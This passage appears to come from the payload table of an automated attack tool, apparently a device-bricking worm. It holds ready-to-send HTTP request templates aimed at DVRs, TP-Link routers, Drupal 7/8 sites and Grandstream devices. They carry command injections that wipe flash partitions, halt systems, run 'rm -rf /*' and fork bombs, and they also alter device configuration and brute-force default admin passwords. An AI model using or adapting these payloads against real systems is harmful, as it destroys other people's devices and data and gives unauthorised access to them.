  'POST /dvr/cmd HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: %%BODYLENGTH%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nUser-Agent: Test\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" Server="time.nist.gov&busybox cat /dev/zero>/dev/mtdblock4"/></Service></DVR>]]></SetConfiguration></DVR>',
  'POST /dvr/cmd HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: %%BODYLENGTH%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nUser-Agent: Test\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" Server="time.nist.gov&busybox cat /dev/zero>/dev/mtdblock5"/></Service></DVR>]]></SetConfiguration></DVR>',
  'POST /dvr/cmd HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: %%BODYLENGTH%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nUser-Agent: Test\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" Server="time.nist.gov&busybox cat /dev/zero>/dev/mtdblock6"/></Service></DVR>]]></SetConfiguration></DVR>',
  'POST /dvr/cmd HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: %%BODYLENGTH%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nUser-Agent: Test\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" Server="time.nist.gov&busybox cat /dev/zero>/dev/root"/></Service></DVR>]]></SetConfiguration></DVR>',
  'POST /dvr/cmd HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: %%BODYLENGTH%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nUser-Agent: Test\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" Server="time.nist.gov&halt"/></Service></DVR>]]></SetConfiguration></DVR>',
  'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
  ],

  # TBK DVR crap
	[ 'tbkdvr', '(\/login\.rsp)',
		'GET /device.rsp?opt=user&cmd=list HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: uid=admin\r\n\r\n',
		'POST /logincheck.rsp?type=1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: uid=admin\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nusername=%%LOGIN%%&userpwd=%%PASSWORD%%',
#		'POST /getparameter.json HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: session=%%CUSTOM1%%; uid=%%LOGIN%%\r\n\r\nREQ=%7B%22MODULE%22%3A%22CONFIGMODEL%22%2C%22OPERATION%22%3A%22SET%22%2C%22PARAMETER%22%3A%7B%22AVSM%22%3A%7B%22OSD%22%3A%5B%7B%22CHEN%22%3A%221%22%2C%22CHNAME%22%3A%22HACKED%22%2C%22CHX%22%3A%2232%22%2C%22CHY%22%3A%2296%22%2C%22TMEN%22%3A%221%22%2C%22TX%22%3A%22384%22%2C%22TY%22%3A%2216%22%7D%2C%7B%22CHEN%22%3A%221%22%2C%22CHNAME%22%3A%22HACKED%22%2C%22CHX%22%3A%2232%22%2C%22CHY%22%3A%2296%22%2C%22TMEN%22%3A%221%22%2C%22TX%22%3A%22384%22%2C%22TY%22%3A%2216%22%7D%2C%7B%22CHEN%22%3A%221%22%2C%22CHNAME%22%3A%22HACKED%22%2C%22CHX%22%3A%2232%22%2C%22CHY%22%3A%2296%22%2C%22TMEN%22%3A%221%22%2C%22TX%22%3A%22384%22%2C%22TY%22%3A%2216%22%7D%2C%7B%22CHEN%22%3A%221%22%2C%22CHNAME%22%3A%22HACKED%22%2C%22CHX%22%3A%2232%22%2C%22CHY%22%3A%2296%22%2C%22TMEN%22%3A%221%22%2C%22TX%22%3A%22384%22%2C%22TY%22%3A%2216%22%7D%2C%7B%22CHEN%22%3A%221%22%2C%22CHNAME%22%3A%22HACKED%22%2C%22CHX%22%3A%2232%22%2C%22CHY%22%3A%2296%22%2C%22TMEN%22%3A%221%22%2C%22TX%22%3A%22384%22%2C%22TY%22%3A%2216%22%7D%2C%7B%22CHEN%22%3A%221%22%2C%22CHNAME%22%3A%22HACKED%22%2C%22CHX%22%3A%2232%22%2C%22CHY%22%3A%2296%22%2C%22TMEN%22%3A%221%22%2C%22TX%22%3A%22384%22%2C%22TY%22%3A%2216%22%7D%2C%7B%22CHEN%22%3A%221%22%2C%22CHNAME%22%3A%22HACKED%22%2C%22CHX%22%3A%2232%22%2C%22CHY%22%3A%2296%22%2C%22TMEN%22%3A%221%22%2C%22TX%22%3A%22384%22%2C%22TY%22%3A%2216%22%7D%2C%7B%22CHEN%22%3A%221%22%2C%22CHNAME%22%3A%22HACKED%22%2C%22CHX%22%3A%2232%22%2C%22CHY%22%3A%2296%22%2C%22TMEN%22%3A%221%22%2C%22TX%22%3A%22384%22%2C%22TY%22%3A%2216%22%7D%5D%2C%22VCP%22%3A%5B%7B%22AREA%22%3A%5B%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%5D%2C%22EN%22%3A%221%22%7D%2C%7B%22AREA%22%3A%5B%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%5D%2C%22EN%22%3A%220%22%7D%2C%7B%22AREA%22%3A%5B%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%5D%2C%22EN%22%3A%220%22%7D%2C%7B%22AREA%22%3A%5B%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%5D%2C%22EN%22%3A%220%22%7D%2C%7B%22AREA%22%3A%5B%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%5D%2C%22EN%22%3A%220%22%7D%2C%7B%22AREA%22%3A%5B%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%5D%2C%22EN%22%3A%220%22%7D%2C%7B%22AREA%22%3A%5B%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%5D%2C%22EN%22%3A%220%22%7D%2C%7B%22AREA%22%3A%5B%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%2C%7B%22H%22%3A%220%22%2C%22W%22%3A%220%22%2C%22X%22%3A%220%22%2C%22Y%22%3A%220%22%7D%5D%2C%22EN%22%3A%220%22%7D%5D%7D%7D%2C%22SESSION%22%3A%22FROMIE%22%7D&PAGEID=display_set',
		'POST /getparameter.json HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: session=%%CUSTOM1%%; uid=%%LOGIN%%\r\n\r\nREQ=%7B%22MODULE%22%3A%22CONFIGMODEL%22%2C%22OPERATION%22%3A%22SET%22%2C%22PARAMETER%22%3A%7B%22AVSM%22%3A%7B%22MAIN%22%3A%5B%7B%22FR%22%3A%2215%22%7D%2C%7B%22FR%22%3A%2215%22%7D%2C%7B%22FR%22%3A%2215%22%7D%2C%7B%22FR%22%3A%2215%22%7D%2C%7B%22FR%22%3A%2215%22%7D%2C%7B%22FR%22%3A%2215%22%7D%2C%7B%22FR%22%3A%2215%22%7D%2C%7B%22FR%22%3A%2215%22%7D%5D%7D%2C%22DEVEMM%22%3A%7B%22SSP%22%3A%7B%22DEVN%22%3A%22HACKED%22%2C%22UID%22%3A%220%22%2C%22VSA%22%3A%221%22%7D%7D%7D%2C%22SESSION%22%3A%22FROMIE%22%7D&PAGEID=systemPage_set',
		'POST /getparameter.json HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: session=%%CUSTOM1%%; uid=%%LOGIN%%\r\n\r\nREQ=%7B%22MODULE%22%3A%22CONFIGMODEL%22%2C%22OPERATION%22%3A%22SET%22%2C%22PARAMETER%22%3A%7B%22NWSM%22%3A%7B%22UPNP%22%3A%7B%22ENABLE%22%3A%220%22%7D%7D%7D%2C%22SESSION%22%3A%22FROMIE%22%7D&PAGEID=UPnP_set',
		'POST /getparameter.json HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: session=%%CUSTOM1%%; uid=%%LOGIN%%\r\n\r\nREQ=%7B%22MODULE%22%3A%22CONFIGMODEL%22%2C%22OPERATION%22%3A%22SET%22%2C%22PARAMETER%22%3A%7B%22NWSM%22%3A%7B%22UPNP%22%3A%7B%22ENABLE%22%3A%220%22%7D%7D%7D%2C%22SESSION%22%3A%22FROMIE%22%7D&PAGEID=UPnP_set',
		'POST /getparameter.json HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: session=%%CUSTOM1%%; uid=%%LOGIN%%\r\n\r\nREQ=%7B%22MODULE%22%3A%22CONFIGMODEL%22%2C%22OPERATION%22%3A%22SET%22%2C%22PARAMETER%22%3A%7B%22NWSM%22%3A%7B%22ETHERNET%22%3A%7B%22DNS%22%3A%7B%22ADNS%22%3A%221.2.3.7%22%2C%22PDNS%22%3A%221.2.3.6%22%7D%2C%22DNSMODE%22%3A%220%22%2C%22IPMODE%22%3A%220%22%2C%22PIP%22%3A%7B%22GATEWAY%22%3A%2210.%%RAND8%%%22%2C%22IPADDR%22%3A%2210.%%COMP8%%%22%2C%22SUBMASK%22%3A%22255.255.255.0%22%7D%7D%7D%7D%2C%22SESSION%22%3A%22FROMIE%22%7D&PAGEID=right_set',
		'POST /getparameter.json HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: session=%%CUSTOM1%%; uid=%%LOGIN%%\r\n\r\nREQ=%7B%22MODULE%22%3A%22CONFIGMODEL%22%2C%22OPERATION%22%3A%22SET%22%2C%22PARAMETER%22%3A%7B%22NWSM%22%3A%7B%22ADSL%22%3A%7B%22ENABLE%22%3A%220%22%2C%22PWD%22%3A%22HACKED%22%2C%22USERID%22%3A%22HACKED@HACKED.com%22%7D%7D%7D%2C%22SESSION%22%3A%22FROMIE%22%7D&PAGEID=right_asdl_set',
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
	],

  # TPLink RCEs and DoS for good measure
	[ 'tplink849', '(HTTP/1.1 200 OK;Content-Type: text/html; charset=utf-8;Content-Length: \d+;Connection: keep-alive)',
		'POST /cgi?2 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://192.168.0.1/mainFrame.htm\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\ndataBlockSize=64\r\ntimeout=5\r\nnumberOfRepetitions=1\r\nhost=127.0.0.1;cat /dev/zero>/dev/mtdblock0;cat /dev/zero>/dev/mtdblock1;cat /dev/zero>/dev/mtdblock2;cat /dev/zero>/dev/mtdblock3;cat /dev/zero>/dev/mtdblock4;cat /dev/zero>/dev/mtdblock5;cat /dev/zero>/dev/root\r\nX_TP_ConnName=ewan_ipoe_s\r\ndiagnosticsState=Requested\r\n',
		'POST /cgi?7 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://192.168.0.1/mainFrame.htm\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n',
		'POST /cgi?2 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://192.168.0.1/mainFrame.htm\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\r\nmaxHopCount=20\r\ntimeout=5\r\nnumberOfTries=1\r\nhost="$(cat /dev/zero>/dev/mtdblock0;cat /dev/zero>/dev/mtdblock1;cat /dev/zero>/dev/mtdblock2;cat /dev/zero>/dev/mtdblock3;cat /dev/zero>/dev/mtdblock4;cat /dev/zero>/dev/mtdblock5;cat /dev/zero>/dev/root;halt)"\r\ndataBlockSize=64\r\nX_TP_ConnName=ewan_pppoe\r\ndiagnosticsState=Requested\r\nX_TP_HopSeq=0\r\n',
		'POST /cgi?7 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://192.168.0.1/mainFrame.htm\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n',
		# if still here, try auth with default account admin:admin
		'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/\r\nConnection: close\r\nContent-Type: text/plain\r\nCookie: Authorization=Basic YWRtaW46YWRtaW4=\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n',
		# disable interface w default auth
		'POST /cgi?4 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/\r\nConnection: close\r\nContent-Type: text/plain\r\nCookie: Authorization=Basic YWRtaW46YWRtaW4=\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n[WAN_IP_CONN#1,1,1,0,0,0#0,0,0,0,0,0]0,0\r\n',
		'POST /cgi?4 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/\r\nConnection: close\r\nContent-Type: text/plain\r\nCookie: Authorization=Basic YWRtaW46YWRtaW4=\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n[WAN_CONN_DEVICE#1,1,0,0,0,0#0,0,0,0,0,0]0,0\r\n',
		'POST /cgi?4 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/\r\nConnection: close\r\nContent-Type: text/plain\r\nCookie: Authorization=Basic YWRtaW46YWRtaW4=\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n[WAN_PPP_CONN#1,4,1,0,0,0#0,0,0,0,0,0]0,0\r\n',
		'POST /cgi?4 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/\r\nConnection: close\r\nContent-Type: text/plain\r\nCookie: Authorization=Basic YWRtaW46YWRtaW4=\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n[WAN_PPP_CONN#1,2,1,0,0,0#0,0,0,0,0,0]0,0\r\n',
		# change operation mode w default auth
		'POST /cgi?2 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/\r\nConnection: close\r\nContent-Type: text/plain\r\nCookie: Authorization=Basic YWRtaW46YWRtaW4=\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n[SYS_MODE#0,0,0,0,0,0#0,0,0,0,0,0]0,1\r\nmode=ETH\r\n',
    # if still here, try halt with auth bypass
		'POST /cgi?1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://192.168.0.1/mainFrame.htm\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3\r\ndiagnosticsState\r\nX_TP_HopSeq\r\nX_TP_Result\r\n',
		'POST /cgi?2 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://192.168.0.1/mainFrame.htm\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\r\nmaxHopCount=20\r\ntimeout=5\r\nnumberOfTries=1\r\nhost="$(halt)"\r\ndataBlockSize=64\r\nX_TP_ConnName=ewan_pppoe\r\ndiagnosticsState=Requested\r\nX_TP_HopSeq=0\r\n',
		'POST /cgi?7 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://192.168.0.1/mainFrame.htm\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n',
		'POST /cgi?1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://192.168.0.1/mainFrame.htm\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3\r\ndiagnosticsState\r\nX_TP_HopSeq\r\nX_TP_Result\r\n',
    # still here? reboot attempt with auth cookie (needed if operation mode was sucessfully changed)
		'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/\r\nConnection: close\r\nContent-Type: text/plain\r\nCookie: Authorization=Basic YWRtaW46YWRtaW4=\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n',
    'POST /cgi?7 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/\r\nConnection: close\r\nContent-Type: text/plain\r\nCookie: Authorization=Basic YWRtaW46YWRtaW4=\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n[ACT_REBOOT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n',
    # still here? try the stupid DoS
		'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: x\r\n\r\n',
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
  ],

  # Drupalgeddon 2
  [ 'drupal8', 'X-Generator: Drupal 8',
  	'POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nform_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=cat /dev/urandom >/dev/root',
  	'POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nform_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=rm -rf *',
  	'POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nform_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=rm -rf /*',
  	'POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nform_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=d() { d | d & }; d',
  	'POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nform_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=cat /dev/urandom >/tmp/.phillr',
  	'POST /user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nform_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=cat /dev/urandom >/dev/root',
  	'POST /user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nform_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=rm -rf *',
  	'POST /user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nform_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=rm -rf /*',
  	'POST /user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nform_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=d() { d | d & }; d',
  	'POST /user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nform_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=cat /dev/urandom >/tmp/.phillr',
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
  ],
  [ 'drupal7', 'X-Generator: Drupal 7',
    'POST /drupal-7.55/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=rm+-rf HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nform_id=user_pass&_triggering_element_name=name',
    'POST /drupal-7.55/?q=file/ajax/name/%23value/%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n%%CUSTOM1%%',
    'POST /drupal-7.55/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=rm+-rf+/* HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nform_id=user_pass&_triggering_element_name=name',
    'POST /drupal-7.55/?q=file/ajax/name/%23value/%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n%%CUSTOM1%%',
    'POST /drupal-7.55/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=d+{+d+|+d+&+};+d HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nform_id=user_pass&_triggering_element_name=name',
    'POST /drupal-7.55/?q=file/ajax/name/%23value/%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n%%CUSTOM1%%',
    'POST /drupal-7.55/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=cat+/dev/urandom+>/tmp/.philler HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nform_id=user_pass&_triggering_element_name=name',
    'POST /drupal-7.55/?q=file/ajax/name/%23value/%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n%%CUSTOM1%%',
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
  ],    
  
  # Grandstream GXV etc
  [ 'grandstream', 'Server: GS-Webs',
  	'GET /Pages/system.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\n',
  	'GET /Pages/system.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MTIzNDU=\r\n\r\n',
  	'GET /Pages/system.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\n\r\n',
  	'GET /Pages/system.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MTIzNDU2\r\n\r\n',
  	'GET /Pages/system.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46ODg4ODg4\r\n\r\n',
